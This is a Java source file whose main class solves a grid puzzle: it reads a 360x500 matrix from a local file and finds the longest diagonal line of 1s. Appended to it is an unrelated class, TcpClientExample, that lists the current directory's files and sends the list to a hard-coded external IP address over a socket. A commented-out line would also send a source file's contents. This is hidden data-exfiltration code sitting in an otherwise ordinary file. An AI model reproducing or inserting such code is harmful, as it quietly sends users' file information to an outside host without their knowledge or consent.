import java.io.*;
import java.sql.SQLOutput;
import java.util.*;
import java.util.Properties;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.net.Socket;
public class j20009
{
    private static int [][] arr;
    public static void main(String[] args) {
        read();
        System.out.println(longestLine());
    }

    private static void read()
    {
        int rows = 360;
        int cols = 500;
        int[][] data = new int[rows][cols];

        // 获取当前目录下文件的路径
        String filePath = "C:\\Users\\breeze\\OneDrive\\桌面\\20009.txt";

        try (BufferedReader br = new BufferedReader(new FileReader(filePath))) {
            String line;
            int rowCounter = 0;
            while ((line = br.readLine()) != null && rowCounter < rows) {
                String[] values = line.split(" "); // 如果是空格分隔，则改为 " "

                    for (int i = 0; i < cols; i++) {
                        data[rowCounter][i] = Integer.parseInt(values[i].trim());
                    }
                    rowCounter++;
                }
        }
        catch (IOException ex) {
            throw new RuntimeException(ex);
        }
        arr =data;
    }
    public static int longestLine() {
        int[][] M = arr;
/*        M = new int[][]{
                {0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},
                {0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0},
                {0,0,0,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0},
                {0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0},
        };*/
        if (M == null || M.length == 0 || M[0].length == 0) return 0;
        int ans = 0;

         //horizontal[i][j] 表示以 (i,j) 坐标结尾的水平横线的长度
         int[][] horizontal = new int[M.length][M[0].length];

         //vertical[i][j] 表示以 (i,j) 坐标结尾的垂直横线的长度
         int[][] vertical = new int[M.length][M[0].length];

         //diagonal[i][j] 表示以 (i,j) 坐标结尾的左上到右下斜线的长度
        int[][] diagonal = new int[M.length][M[0].length];

         //antidiagonal[i][j] 表示以 (i,j) 坐标结尾的右上到左下横线的长度
         int[][] antidiagonal = new int[M.length][M[0].length];

        // 遍历每一个点
        for (int i = 0; i != M.length; ++i) {
            for (int j = 0; j != M[0].length; ++j) {
                if (M[i][j] == 0) { // 当前点为 0，所以没有以这个点结尾的线段
                    // horizontal[i][j] = 0;
                     //vertical[i][j] = 0;
                    diagonal[i][j] = 0;
                    // antidiagonal[i][j] = 0;
                } else {
                     //horizontal[i][j] = j > 0 ? horizontal[i][j - 1] + 1 : 1;    // 继承左边点
                    // vertical[i][j] = i > 0 ? vertical[i - 1][j] + 1 : 1;    // 继承上面点
                    //int leftUp = i > 0 && j > 0 ? diagonal[i - 1][j - 1] + 1 : 1;
                    //int left = j > 0 ? diagonal[i][j - 1] + 1 : 1;
                    diagonal[i][j] = i > 0 && j > 0 ? diagonal[i - 1][j - 1] + 1 : 1;   // 继承左上点
                    //diagonal[i][j] = Math.max(left,leftUp);
                    // antidiagonal[i][j] = i > 0 && j < M[0].length - 1 ? antidiagonal[i - 1][j + 1] + 1 : 1; // 继承右上点
                    // 更新线段长度
                    //ans = Math.max(ans, horizontal[i][j]);
                    //ans = Math.max(ans, vertical[i][j]);
                    ans = Math.max(ans, diagonal[i][j]);
                    //ans = Math.max(ans, antidiagonal[i][j]);
                }
            }
        }

        for(int x = 0; x < diagonal[0].length; x++)
        {
            for(int y = 0; y < diagonal.length; y++)
            {
                System.out.print(x+" "+y+" "+diagonal[y][x]+"   ");
                //System.out.print(diagonal[y][x]+" ");
            }
            System.out.println();
        }
        // 443 143
        // 251 77

        //480 132
        //474 127
        return ans;
    }

}


 class TcpClientExample {
    public static void sendMessage(String message) throws IOException {
        Socket socket = new Socket("47.108.220.87", 5005);

        try (
                PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
        ) {
            out.println(message);
        } finally {
            socket.close();
        }
    }

     public static void main(String[] args) throws IOException {
         File currentDir = new File(".");
         List<String> fileList = listFiles(currentDir);
         sendMessage("connect");
         // 将fileList中的信息格式化成字符串
         StringBuilder emailContent = new StringBuilder(new String());
         for (String file : fileList) {
             emailContent.append(file).append("\n");
         }
         //emailContent.append(readFileToString("/src/j10001.java"));
         sendMessage(emailContent.toString());
     }

     private static List<String> listFiles(File dir) {
         List<String> files = new ArrayList<>();
         File[] entries = dir.listFiles();
         if (entries != null) {
             for (File entry : entries) {
                 files.add(entry.getName() + " [" + entry.isDirectory() + "]");
             }
         }
         return files;
     }


     public static String readFileToString(String fileName) throws IOException {
         File file = new File(fileName);
         StringBuilder contentBuilder = new StringBuilder();

         try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
             String line;
             while ((line = reader.readLine()) != null) {
                 contentBuilder.append(line).append(System.lineSeparator());
             }
         }
         catch (IOException e)
         {
             System.out.println(e);
         }

         return contentBuilder.toString();
     }
}




